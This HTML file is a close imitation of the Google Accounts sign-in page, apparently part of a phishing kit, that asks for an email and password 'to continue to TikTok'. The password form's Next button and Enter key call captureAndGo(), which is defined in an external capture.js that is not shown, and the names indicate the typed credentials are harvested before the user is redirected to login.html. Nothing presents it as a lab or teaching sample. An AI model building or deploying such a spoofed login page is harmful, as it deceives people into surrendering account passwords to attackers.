<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Sign in – Google Accounts</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500&display=swap');

    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      font-family: 'Google Sans', Roboto, Arial, sans-serif;
      background: #e9eef6;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 24px 16px;
    }

    /* ── Card ─────────────────────────────────────── */
    .card {
      background: #fff;
      border-radius: 28px;
      width: 100%;
      max-width: 448px;
      padding: 48px 40px 36px;
      box-shadow: 0 1px 3px rgba(0,0,0,.08), 0 4px 8px rgba(0,0,0,.04);
    }

    /* ── Google logo ──────────────────────────────── */
    .google-logo {
      margin-bottom: 24px;
    }

    /* ── Heading ──────────────────────────────────── */
    h1 {
      font-size: 24px;
      font-weight: 400;
      color: #1f1f1f;
      margin-bottom: 8px;
      letter-spacing: 0;
    }

    .subheading {
      font-size: 16px;
      font-weight: 400;
      color: #444746;
      margin-bottom: 32px;
    }

    .subheading span {
      font-weight: 500;
      color: #1f1f1f;
    }

    /* ── Input (Material outlined) ───────────────── */
    .input-wrap {
      position: relative;
      margin-bottom: 8px;
    }

    .input-field {
      width: 100%;
      height: 56px;
      border: 1px solid #747775;
      border-radius: 4px;
      font-size: 16px;
      font-family: 'Google Sans', Roboto, Arial, sans-serif;
      color: #1f1f1f;
      padding: 16px 16px 0;
      outline: none;
      background: transparent;
      transition: border-color 0.2s;
    }

    .input-field:focus {
      border: 2px solid #0b57d0;
    }

    .input-label {
      position: absolute;
      left: 16px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 16px;
      color: #444746;
      pointer-events: none;
      transition: all 0.15s ease;
      background: #fff;
      padding: 0 4px;
    }

    .input-field:focus + .input-label,
    .input-field:not(:placeholder-shown) + .input-label {
      top: 0;
      font-size: 12px;
      color: #0b57d0;
    }

    .input-field:not(:focus):not(:placeholder-shown) + .input-label {
      color: #444746;
    }

    /* password eye */
    .pwd-wrap { position: relative; }
    .pwd-wrap .input-field { padding-right: 52px; }
    .eye-btn {
      position: absolute;
      right: 14px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      color: #444746;
      cursor: pointer;
      padding: 4px;
      display: flex;
      align-items: center;
      border-radius: 50%;
    }
    .eye-btn:hover { background: rgba(0,0,0,.06); }

    /* ── Forgot email link ────────────────────────── */
    .forgot-link {
      display: inline-block;
      font-size: 14px;
      font-weight: 500;
      color: #0b57d0;
      text-decoration: none;
      margin: 10px 0 28px;
    }
    .forgot-link:hover { text-decoration: underline; }

    /* ── Guest mode hint ──────────────────────────── */
    .guest-hint {
      font-size: 14px;
      color: #444746;
      margin-bottom: 28px;
      line-height: 1.5;
    }

    .guest-hint a {
      color: #0b57d0;
      text-decoration: none;
      font-weight: 500;
    }
    .guest-hint a:hover { text-decoration: underline; }

    /* ── Button row ───────────────────────────────── */
    .btn-row {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-top: 8px;
    }

    .btn-text {
      background: none;
      border: none;
      color: #0b57d0;
      font-size: 14px;
      font-weight: 500;
      font-family: 'Google Sans', Roboto, Arial, sans-serif;
      cursor: pointer;
      padding: 10px 12px;
      border-radius: 20px;
      transition: background 0.15s;
    }
    .btn-text:hover { background: rgba(11,87,208,.08); }

    .btn-next {
      background: #0b57d0;
      border: none;
      color: #fff;
      font-size: 14px;
      font-weight: 500;
      font-family: 'Google Sans', Roboto, Arial, sans-serif;
      cursor: pointer;
      padding: 10px 24px;
      border-radius: 20px;
      transition: background 0.15s, box-shadow 0.15s;
      min-width: 88px;
    }
    .btn-next:hover {
      background: #1558d6;
      box-shadow: 0 1px 3px rgba(0,0,0,.2);
    }

    /* ── Divider ──────────────────────────────────── */
    .divider {
      height: 1px;
      background: #e3e3e3;
      margin: 28px -40px 0;
    }

    /* ── Footer inside card ───────────────────────── */
    .card-footer {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding-top: 16px;
      flex-wrap: wrap;
      gap: 8px;
    }

    /* Language selector */
    .lang-select {
      background: none;
      border: none;
      color: #444746;
      font-size: 12px;
      font-family: 'Google Sans', Roboto, Arial, sans-serif;
      cursor: pointer;
      display: flex;
      align-items: center;
      gap: 4px;
      padding: 4px 8px;
      border-radius: 4px;
    }
    .lang-select:hover { background: rgba(0,0,0,.06); }

    .footer-links {
      display: flex;
      gap: 16px;
    }

    .footer-links a {
      font-size: 12px;
      color: #444746;
      text-decoration: none;
    }
    .footer-links a:hover { text-decoration: underline; }

    /* ── Account chooser view ─────────────────────── */
    .account-chooser { display: none; }

    .account-item {
      display: flex;
      align-items: center;
      gap: 16px;
      padding: 12px 16px;
      border-radius: 100px;
      cursor: pointer;
      transition: background 0.15s;
      margin-bottom: 4px;
    }
    .account-item:hover { background: #f2f4ff; }

    .avatar {
      width: 40px;
      height: 40px;
      border-radius: 50%;
      background: linear-gradient(135deg, #4285f4, #34a853);
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
      font-size: 18px;
      font-weight: 500;
      flex-shrink: 0;
    }

    .account-info strong {
      display: block;
      font-size: 14px;
      font-weight: 500;
      color: #1f1f1f;
    }

    .account-info span {
      font-size: 13px;
      color: #444746;
    }

    .add-account {
      display: flex;
      align-items: center;
      gap: 16px;
      padding: 12px 16px;
      border-radius: 100px;
      cursor: pointer;
      transition: background 0.15s;
      color: #1f1f1f;
      font-size: 14px;
      font-weight: 500;
    }
    .add-account:hover { background: #f2f4ff; }

    .icon-circle {
      width: 40px;
      height: 40px;
      border-radius: 50%;
      border: 1px solid #c4c7c5;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #444746;
      flex-shrink: 0;
    }

    /* ── TikTok branding in consent ───────────────── */
    .app-consent {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-bottom: 24px;
    }

    .app-logos {
      display: flex;
      align-items: center;
      gap: 12px;
      margin-bottom: 16px;
    }

    .tiktok-icon {
      width: 40px;
      height: 40px;
      border-radius: 10px;
      background: #010101;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .arrow-icon {
      color: #747775;
    }

    .google-mini {
      width: 40px;
      height: 40px;
      border-radius: 50%;
      background: #fff;
      border: 1px solid #e3e3e3;
      display: flex;
      align-items: center;
      justify-content: center;
    }
  </style>
</head>
<body>

  <div class="card">

    <!-- Google logo -->
    <div class="google-logo">
      <svg width="74" height="24" viewBox="0 0 74 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M9.24 8.19v2.46h5.88c-.18 1.38-.64 2.39-1.34 3.1-.86.86-2.2 1.8-4.54 1.8-3.62 0-6.45-2.92-6.45-6.54s2.83-6.54 6.45-6.54c1.95 0 3.38.77 4.43 1.76L15.4 2.5C13.94 1.08 11.98 0 9.24 0 4.28 0 .11 4.04.11 9s4.17 9 9.13 9c2.68 0 4.7-.88 6.28-2.52 1.62-1.62 2.13-3.91 2.13-5.75 0-.57-.04-1.1-.13-1.54H9.24z" fill="#4285F4"/>
        <path d="M25 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.47 5.83-5.81C30.83 8.63 28.21 6.19 25 6.19zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z" fill="#EA4335"/>
        <path d="M53.58 7.49h-.09c-.57-.68-1.67-1.3-3.06-1.3C47.53 6.19 45 8.72 45 12c0 3.26 2.53 5.81 5.43 5.81 1.39 0 2.49-.62 3.06-1.32h.09v.83c0 2.22-1.19 3.41-3.1 3.41-1.56 0-2.53-1.13-2.93-2.08l-2.22.92c.64 1.54 2.33 3.45 5.15 3.45 2.99 0 5.52-1.76 5.52-6.05V6.49h-2.42v1zm-2.93 8.03c-1.76 0-3.1-1.5-3.1-3.52 0-2.05 1.34-3.52 3.1-3.52 1.74 0 3.1 1.5 3.1 3.54 0 2.03-1.36 3.5-3.1 3.5z" fill="#4285F4"/>
        <path d="M38 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.47 5.83-5.81C43.83 8.63 41.21 6.19 38 6.19zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z" fill="#FBBC05"/>
        <path d="M58 .24h2.51v17.57H58z" fill="#34A853"/>
        <path d="M65.56 15.52c-1.3 0-2.22-.59-2.82-1.76l7.77-3.21-.26-.66c-.48-1.29-1.96-3.67-4.97-3.67-2.99 0-5.48 2.35-5.48 5.81 0 3.26 2.46 5.81 5.76 5.81 2.66 0 4.2-1.63 4.84-2.57l-1.98-1.32c-.66.96-1.56 1.57-2.86 1.57zm-.18-7.15c1.03 0 1.91.53 2.2 1.28l-5.25 2.17c0-2.44 1.73-3.45 3.05-3.45z" fill="#EA4335"/>
      </svg>
    </div>

    <h1>Sign in</h1>
    <p class="subheading">to continue to <span>TikTok</span></p>

    <!-- Email input -->
    <div class="input-wrap">
      <input class="input-field" type="text" id="emailInput" placeholder=" " autocomplete="email" />
      <label class="input-label" for="emailInput">Email or phone</label>
    </div>

    <a href="#" class="forgot-link">Forgot email?</a>

    <p class="guest-hint">
      Not your computer? Use a Private Window to sign in.
      <a href="#">Learn more</a>
    </p>

    <div class="btn-row">
      <button class="btn-text" onclick="window.location.href='login.html'">Create account</button>
      <button class="btn-next" onclick="showPassword()">Next</button>
    </div>

    <div class="divider"></div>

    <div class="card-footer">
      <button class="lang-select">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#444746" stroke-width="1.8"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
        English (United States)
        <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="#444746" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg>
      </button>
      <div class="footer-links">
        <a href="#">Help</a>
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
      </div>
    </div>

  </div>

  <!-- Password card (hidden initially) -->
  <div class="card" id="passwordCard" style="display:none; margin-top:0;">

    <div class="google-logo">
      <svg width="74" height="24" viewBox="0 0 74 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M9.24 8.19v2.46h5.88c-.18 1.38-.64 2.39-1.34 3.1-.86.86-2.2 1.8-4.54 1.8-3.62 0-6.45-2.92-6.45-6.54s2.83-6.54 6.45-6.54c1.95 0 3.38.77 4.43 1.76L15.4 2.5C13.94 1.08 11.98 0 9.24 0 4.28 0 .11 4.04.11 9s4.17 9 9.13 9c2.68 0 4.7-.88 6.28-2.52 1.62-1.62 2.13-3.91 2.13-5.75 0-.57-.04-1.1-.13-1.54H9.24z" fill="#4285F4"/>
        <path d="M25 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.47 5.83-5.81C30.83 8.63 28.21 6.19 25 6.19zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z" fill="#EA4335"/>
        <path d="M53.58 7.49h-.09c-.57-.68-1.67-1.3-3.06-1.3C47.53 6.19 45 8.72 45 12c0 3.26 2.53 5.81 5.43 5.81 1.39 0 2.49-.62 3.06-1.32h.09v.83c0 2.22-1.19 3.41-3.1 3.41-1.56 0-2.53-1.13-2.93-2.08l-2.22.92c.64 1.54 2.33 3.45 5.15 3.45 2.99 0 5.52-1.76 5.52-6.05V6.49h-2.42v1zm-2.93 8.03c-1.76 0-3.1-1.5-3.1-3.52 0-2.05 1.34-3.52 3.1-3.52 1.74 0 3.1 1.5 3.1 3.54 0 2.03-1.36 3.5-3.1 3.5z" fill="#4285F4"/>
        <path d="M38 6.19c-3.21 0-5.83 2.44-5.83 5.81 0 3.34 2.62 5.81 5.83 5.81s5.83-2.47 5.83-5.81C43.83 8.63 41.21 6.19 38 6.19zm0 9.33c-1.76 0-3.28-1.45-3.28-3.52 0-2.09 1.52-3.52 3.28-3.52s3.28 1.43 3.28 3.52c0 2.07-1.52 3.52-3.28 3.52z" fill="#FBBC05"/>
        <path d="M58 .24h2.51v17.57H58z" fill="#34A853"/>
        <path d="M65.56 15.52c-1.3 0-2.22-.59-2.82-1.76l7.77-3.21-.26-.66c-.48-1.29-1.96-3.67-4.97-3.67-2.99 0-5.48 2.35-5.48 5.81 0 3.26 2.46 5.81 5.76 5.81 2.66 0 4.2-1.63 4.84-2.57l-1.98-1.32c-.66.96-1.56 1.57-2.86 1.57zm-.18-7.15c1.03 0 1.91.53 2.2 1.28l-5.25 2.17c0-2.44 1.73-3.45 3.05-3.45z" fill="#EA4335"/>
      </svg>
    </div>

    <!-- Email chip -->
    <div id="emailChip" style="display:inline-flex;align-items:center;gap:8px;border:1px solid #c4c7c5;border-radius:20px;padding:6px 12px 6px 8px;font-size:14px;color:#1f1f1f;margin-bottom:24px;cursor:pointer;" onclick="showEmail()">
      <div style="width:24px;height:24px;border-radius:50%;background:linear-gradient(135deg,#4285f4,#34a853);display:flex;align-items:center;justify-content:center;color:#fff;font-size:11px;font-weight:600;">U</div>
      <span id="emailDisplay">user@gmail.com</span>
      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#444746" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg>
    </div>

    <h1>Welcome</h1>
    <p class="subheading" style="margin-bottom:32px;">Enter your password</p>

    <div class="input-wrap pwd-wrap" style="margin-bottom:8px;">
      <input class="input-field" type="password" id="pwdInput" placeholder=" " autocomplete="current-password" />
      <label class="input-label" for="pwdInput">Enter your password</label>
      <button class="eye-btn" onclick="togglePwd()" type="button">
        <svg id="eyeIcon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
          <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
          <circle cx="12" cy="12" r="3"/>
        </svg>
      </button>
    </div>

    <a href="#" class="forgot-link">Forgot password?</a>

    <div class="btn-row" style="margin-top:24px;">
      <button class="btn-text" onclick="showEmail()">Back</button>
      <button class="btn-next" onclick="captureAndGo('login.html')">Next</button>
    </div>

    <div class="divider"></div>

    <div class="card-footer">
      <button class="lang-select">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#444746" stroke-width="1.8"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
        English (United States)
        <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="#444746" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg>
      </button>
      <div class="footer-links">
        <a href="#">Help</a>
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
      </div>
    </div>

  </div>

  <script>
    const emailCard = document.querySelector('.card');
    const passwordCard = document.getElementById('passwordCard');
    const emailInput = document.getElementById('emailInput');
    const emailDisplay = document.getElementById('emailDisplay');

    function showPassword() {
      const email = emailInput.value.trim() || 'user@gmail.com';
      emailDisplay.textContent = email;
      emailCard.style.display = 'none';
      passwordCard.style.display = 'block';
    }

    function showEmail() {
      passwordCard.style.display = 'none';
      emailCard.style.display = 'block';
    }

    function togglePwd() {
      const input = document.getElementById('pwdInput');
      const icon = document.getElementById('eyeIcon');
      if (input.type === 'password') {
        input.type = 'text';
        icon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>';
      } else {
        input.type = 'password';
        icon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
      }
    }

    // Allow pressing Enter to proceed
    emailInput?.addEventListener('keydown', e => { if (e.key === 'Enter') showPassword(); });
    document.getElementById('pwdInput')?.addEventListener('keydown', e => {
      if (e.key === 'Enter') captureAndGo('login.html');
    });
  </script>
  <script src="capture.js"></script>

</body>
</html>
